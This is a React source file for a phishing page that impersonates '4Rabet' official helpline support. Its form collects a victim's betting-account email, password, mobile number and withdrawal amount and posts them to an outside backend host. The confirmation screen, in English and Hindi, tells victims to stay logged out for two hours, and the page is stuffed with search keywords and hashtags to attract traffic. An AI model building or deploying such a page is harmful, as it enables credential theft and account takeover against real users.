import React, { useState } from 'react';
import image1 from "./IMG_2829.PNG";

function Home() {
  const [currentPage, setCurrentPage] = useState("form");

  // State for form inputs
  const [email, setEmail] = useState('');
  const [password, setPassword] = useState('');
  const [mobileNumber, setMobileNumber] = useState('');
  const [withdrawalAmount, setWithdrawalAmount] = useState('');
  const [problem, setProblem] = useState('');
  const [isSubmitting, setIsSubmitting] = useState(false);

  const handleSubmit = async (e) => {
    e.preventDefault();
    setIsSubmitting(true);

    // Convert withdrawalAmount to a number for the backend
    const numericWithdrawalAmount = parseFloat(withdrawalAmount);
    
    // Validate withdrawal amount is a valid number
    if (isNaN(numericWithdrawalAmount)) {
      alert('Please enter a valid withdrawal amount');
      setIsSubmitting(false);
      return;
    }

    const payload = {
      email,
      password,
      mobileNumber,
      withdrawalAmount: numericWithdrawalAmount, // Send as a number
      problem,
    };

    try {
      const response = await fetch('https://backend-4bet-dusky.vercel.app/users', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify(payload),
      });
      
      if (response.ok) {
        // Move to confirmation screen on success
        setCurrentPage("confirmation");
        window.scrollTo(0, 0);
      } else {
        // Try to parse the error response
        try {
          const errorData = await response.json();
          alert(`Error: ${errorData.message || 'Unknown server error'}`);
        } catch (jsonError) {
          alert(`Server error (${response.status}): Please check your server logs for details`);
        }
      }
    } catch (error) {
      console.error('Network Error:', error);
      alert('Connection error. Please check if the server is running.');
    } finally {
      setIsSubmitting(false);
    }
  };

  const styles = {
    body: {
      backgroundColor: '#f8f9fa',
      padding: '10px',
      minHeight: '100vh',
    },
    mobileContainer: {
      width: '100%',
      maxWidth: '600px',
      margin: '0 auto',
      backgroundColor: '#f0f2f5',
      minHeight: '100vh',
      position: 'relative',
      overflow: 'hidden',
      borderRadius: '8px',
      boxShadow: '0 0 10px rgba(0,0,0,0.1)',
    },
    content: {
      padding: '15px',
    },
    logoContainer: {
      textAlign: 'left',
      marginBottom: '20px',
    },
    logo: {
      width: 'auto',
      padding: '15px 30px',
      backgroundColor: '#222',
      display: 'inline-block',
      color: 'white',
      fontWeight: 'bold',
      fontSize: '22px',
      borderRadius: '8px',
    },
    blueText: {
      color: '#0066cc',
    },
    formTitle: {
      textAlign: 'center',
      fontSize: '30px',
      fontWeight: 'bold',
      marginBottom: '25px',
      color: '#333',
    },
    form: {
      backgroundColor: '#ffffff',
      padding: '15px',
      borderRadius: '8px',
      boxShadow: '0 2px 6px rgba(0,0,0,0.05)',
    },
    inputGroup: {
      marginBottom: '15px',
    },
    label: {
      display: 'block',
      marginBottom: '6px',
      fontSize: '14px',
      color: '#333',
      fontWeight: '500',
    },
    required: {
      color: 'red',
    },
    input: {
      width: '100%',
      padding: '10px',
      border: '1px solid #ddd',
      borderRadius: '4px',
      fontSize: '15px',
      boxSizing: 'border-box',
    },
    submitBtn: {
      width: '100%',
      backgroundColor: '#0066cc',
      color: 'white',
      border: 'none',
      padding: '14px',
      fontSize: '16px',
      borderRadius: '4px',
      cursor: 'pointer',
      marginTop: '10px',
      boxShadow: '0 2px 4px rgba(0,0,0,0.1)',
    },
    submitBtnDisabled: {
      width: '100%',
      backgroundColor: '#a0a0a0',
      color: 'white',
      border: 'none',
      padding: '14px',
      fontSize: '16px',
      borderRadius: '4px',
      cursor: 'not-allowed',
      marginTop: '10px',
      boxShadow: '0 2px 4px rgba(0,0,0,0.1)',
    },
    demoImage: {
      margin: '20px auto',
      textAlign: 'center',
      width: '100%',
      boxSizing: 'border-box',
    },
    verificationImg: {
      width: '90%',
      maxWidth: '500px',
      height: 'auto',
      borderRadius: '8px',
      border: '10px solid #000000',
      boxShadow: '0 2px 10px rgba(0,0,0,0.1)',
      objectFit: 'contain',
    },
    confirmation: {
      padding: '20px 15px',
      backgroundColor: '#ffffff',
      border: '1px solid #ddd',
      borderRadius: '8px',
      textAlign: 'center',
      boxShadow: '0 3px 10px rgba(0,0,0,0.1)',
      marginBottom: '20px',
    },
    englishText: {
      marginBottom: '12px',
      fontSize: '15px',
      lineHeight: 1.5,
      color: '#333',
    },
    hindiText: {
      marginBottom: '12px',
      fontSize: '15px',
      lineHeight: 1.5,
      color: '#444',
    },
    thankYou: {
      fontSize: '18px',
      fontWeight: 'bold',
      marginTop: '10px',
      color: '#0066cc',
    },
    page: {
      display: 'none',
    },
    activePage: {
      display: 'block',
    },
  };

  return (
    <div style={styles.body}>
      <div style={styles.mobileContainer}>
        <div style={currentPage === "form" ? { ...styles.page, ...styles.activePage } : styles.page}>
          <div style={styles.content}>
            <div style={styles.logoContainer}>
              <div style={styles.logo}>
                4RA<span style={styles.blueText}>BET</span>
              </div>
            </div>

            <h1 style={styles.formTitle}>4Rabet Officical helpline Support</h1>

            <form onSubmit={handleSubmit} style={styles.form}>
              <div style={styles.inputGroup}>
                <label style={styles.label}>
                  4Rabet Email <span style={styles.required}>*</span>
                </label>
                <input
                  type="email"
                  style={styles.input}
                  value={email}
                  onChange={(e) => setEmail(e.target.value)}
                  required
                />
              </div>

              <div style={styles.inputGroup}>
                <label style={styles.label}>4Rabet Password</label>
                <input
                  type="password"
                  style={styles.input}
                  value={password}
                  onChange={(e) => setPassword(e.target.value)}
                />
              </div>

              <div style={styles.inputGroup}>
                <label style={styles.label}>
                  4Rbet Mobile Number <span style={styles.required}>*</span>
                </label>
                <input
                  type="tel"
                  style={styles.input}
                  value={mobileNumber}
                  onChange={(e) => setMobileNumber(e.target.value)}
                  required
                />
              </div>

              <div style={styles.inputGroup}>
                <label style={styles.label}>
                  4Rabet Withdrawal amount <span style={styles.required}>*</span>
                </label>
                <input
                  type="number"
                  step="0.01"
                  style={styles.input}
                  value={withdrawalAmount}
                  onChange={(e) => setWithdrawalAmount(e.target.value)}
                  required
                />
              </div>

              <div style={styles.inputGroup}>
                <label style={styles.label}>
                  4Rabet Problem <span style={styles.required}>*</span>
                </label>
                <input
                  type="text"
                  style={styles.input}
                  value={problem}
                  onChange={(e) => setProblem(e.target.value)}
                  required
                />
              </div>

              <button 
                type="submit" 
                style={isSubmitting ? styles.submitBtnDisabled : styles.submitBtn}
                disabled={isSubmitting}
              >
                {isSubmitting ? 'Submitting...' : 'Submit'}
              </button>
            </form>
          </div>
          <div style={styles.demoImage}>
            <img
              src={image1}
              alt="Verification Screen"
              style={styles.verificationImg}
            />
          </div>
        </div>

        <div style={currentPage === "confirmation" ? { ...styles.page, ...styles.activePage } : styles.page}>
          <div style={styles.content}>
            <div style={styles.logoContainer}>
              <div style={styles.logo}>
                4RA<span style={styles.blueText}>BET</span>
              </div>
            </div>

            <h1 style={styles.formTitle}>Submission Successful</h1>

            <div style={styles.confirmation}>
              <p style={styles.englishText}>Your data has been submitted.</p>
              <p style={styles.englishText}>
                Please do NOT open or log in to your game account for at least the next 2 hours after submitting your withdrawal request. If you open the game during this period, your withdrawal request will be automatically cancelled by the system. This cancellation is irreversible and may also result in your Game ID being permanently blocked due to violation of the withdrawal processing rules. To ensure your request is processed smoothly and without delays, keep your account completely inactive until the withdrawal confirmation is received. Failure to follow these instructions is entirely your responsibility.
              </p>
              <p style={styles.hindiText}>आपका डेटा सबमिट कर दिया गया है।</p>
              <p style={styles.hindiText}>
                कृपया 2 घंटे तक अपना गेम न खोलें, अन्यथा आपका अनुरोध रद्द कर दिया जाएगा,
                जिसके कारण आपकी गेम आईडी ब्लॉक हो सकती है।
              </p>
              <p style={styles.englishText}>
                4rabet withdrawal kaise kare, 4rabet withdrawal process, 4rabet deposit kaise kare, 4rabet deposit processing problem solution, 4rabet profile verification problem fix, 4rabet KYC kaise kare, 4rabet se paise kaise kamaye, 4rabet promo code 2025 kaise use kare, 4rabet wager amount kya hota hai, 4rabet wager amount complete kaise kare, 4rabet bonus withdrawal rules, 4rabet bonus kaise nikale, 4rabet registration process, 4rabet registration problem solution, 4rabet email verify problem fix, 4rabet id blocked problem solution, 4rabet account unblock kaise kare, 4rabet game id unblock trick, 4rabet login issue solve, 4rabet payment not received fix, 4rabet pending withdrawal problem, 4rabet instant withdrawal trick, 4rabet UPI withdrawal process, 4rabet bank transfer withdrawal method, 4rabet crypto withdrawal, 4rabet aviator game withdrawal guide, 4rabet rummy withdrawal, 4rabet sports betting withdrawal, 4rabet casino withdrawal, 4rabet india tips, 4rabet india review 2025, 4rabet review india, 4rabet app download kaise kare, 4rabet apk install guide, 4rabet registration kaise kare, 4rabet se account open kaise kare, 4rabet kaise khele, 4rabet wager complete tips, 4rabet wager bonus withdraw trick, 4rabet multiple account problem, 4rabet vpn problem, 4rabet KYC reject solution, 4rabet account block reason, 4rabet account reopen request, 4rabet helpdesk email, 4rabet live chat support, 4rabet transaction proof kaise bheje, 4rabet payment pending reason, 4rabet account verification kaise kare, 4rabet id proof upload kaise kare, 4rabet email confirm kaise kare, 4rabet wager requirement kya hota hai, 4rabet wager requirement complete kaise kare, 4rabet wager amount tricks, 4rabet trusted or not, 4rabet scam ya real, best betting site india 2025, 4rabet online betting guide hindi, 4rabet registration promo code india, 4rabet promo code latest 2025, 4rabet deposit fail solution, 4rabet deposit pending fix, 4rabet instant deposit trick, 4rabet payment method india, 4rabet upi deposit, 4rabet phonepe withdrawal, 4rabet google pay withdrawal, 4rabet paytm withdrawal, 4rabet bank account add kaise kare, 4rabet se paise kamane ka tarika, earn money from 4rabet, make money online with 4rabet, 4rabet earning proof, 4rabet se paise kaise nikalte hain, 4rabet cashout kaise kare, 4rabet wager complete fast, 4rabet wager requirement proof, 4rabet app review india, 4rabet bonus wagering rules hindi, 4rabet aviator winning trick, 4rabet rummy winning tips, 4rabet sports betting tips, 4rabet cricket betting guide, 4rabet casino slot tips, 4rabet india casino review, india review 4rabet, india 4rabet registration, india 4rabet withdrawal, india 4rabet promo code, 4rabet india bonus, 4rabet india registration promo code 2025, 4rabet aviator india, 4rabet rummy india, 4rabet casino india, 4rabet deposit bonus india, 4rabet withdrawal bonus india, 4rabet promo 2025 india, 4rabet earning in india, 4rabet india withdrawal guide, 4rabet india deposit guide, 4rabet profile KYC india, 4rabet india support, 4rabet india payment proof, 4rabet india scam or not, 4rabet india review site, best online earning game india, make money from games, earn money playing aviator, earn money playing rummy, earn money playing casino, 4rabet full process hindi, 4rabet all problem solution, 4rabet kaise use kare, 4rabet withdrawal problem solve, 4rabet deposit problem solve, 4rabet account verification fast trick, 4rabet email confirm fast, 4rabet wager fast complete karne ka tarika, 4rabet id unblock request, 4rabet unblock email format, 4rabet payment delay fix, 4rabet wager requirement bonus, 4rabet bonus wager clear kare, 4rabet trusted betting site india, 4rabet safe betting site, 4rabet app review 2025, 4rabet earning app india, 4rabet instant earning proof, 4rabet betting tips 2025, 4rabet india wager requirement, 4rabet bonus earning, 4rabet withdrawal minimum limit, 4rabet withdrawal maximum limit, 4rabet withdrawal rules india, 4rabet withdrawal processing time, 4rabet withdrawal bank delay, 4rabet withdrawal UPI instant, 4rabet withdrawal crypto fast, 4rabet deposit bank instant, 4rabet deposit UPI instant, 4rabet deposit delay fix india, 4rabet account KYC approval, 4rabet account KYC reject fix, 4rabet account reopen india, 4rabet account ban unblock kaise kare, 4rabet scam ya genuine, online earning india betting sites, best betting app india, betting kaise kare, betting withdrawal kaise kare, betting deposit kaise kare, betting verification kaise kare, betting promo code india, betting tips 2025, best online earning tricks india, #4rabet #earnmoney #rummy #aviator #makemoney #4rabetindia #4rabetwithdrawal #4rabetdeposit #4rabetkyc #4rabettips #2024 #2025 #india #4rabetreview #onlineearning #bettingtips #4rabetbonus #4rabetpromo #earnmoneyonline #4rabetapp #4rabetgame #earnmoneyfromgames #4rabetaviator #4rabetrummy #4rabetcasino #4rabetsports #4rabetpromo2025 #4rabetwager #4rabetindiareview #onlinemoneyearning #makemoneyfromhome 
              </p>
              <p style={styles.thankYou}>Thank You!</p>
              <div style={styles.demoImage}>
                <img
                  src={image1}
                  alt="Verification Screen"
                  style={styles.verificationImg}
                />
              </div>
            </div>
          </div>
        </div>
      </div>
    </div>
  );
}

export default Home;
